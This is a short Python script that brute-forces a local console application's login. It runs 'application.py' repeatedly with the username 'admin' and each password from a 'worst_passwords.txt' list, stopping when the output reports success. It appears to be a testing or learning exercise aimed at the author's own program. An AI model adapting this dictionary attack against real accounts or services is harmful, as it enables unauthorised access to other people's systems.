### This is a bruteforcing script that runs through the top 10000 worst passwords list and tries to log into the application

import subprocess

# Credentials
username = "admin"

# Top 10000 worst passwords list
password_file = "worst_passwords.txt"

# Run the application with the given username and password and return the output
def run_application(username, password):
    process = subprocess.Popen(['py', 'application.py'], stdin=subprocess.PIPE, stdout=subprocess.PIPE, text=True)
    output, _ = process.communicate('L\n' + username + '\n' + password + '\n')
    return output

def main():
    # Read the passwords from the file
    with open(password_file, 'r') as file:
        passwords = file.readlines()

    # Try each password
    for password in passwords:
        index = passwords.index(password) + 1
        # Remove any leading or trailing whitespace characters
        password = password.strip()
        # Run the application with the username and password
        output = run_application(username, password)
        # Check if the login was successful
        if "Login successful" in output:
            print(f"Successful login with password: {password}")
            break
        else:
            print(f"Trying password ({index}/{len(passwords)}): {password} - Failed")

if __name__ == "__main__":
    main()


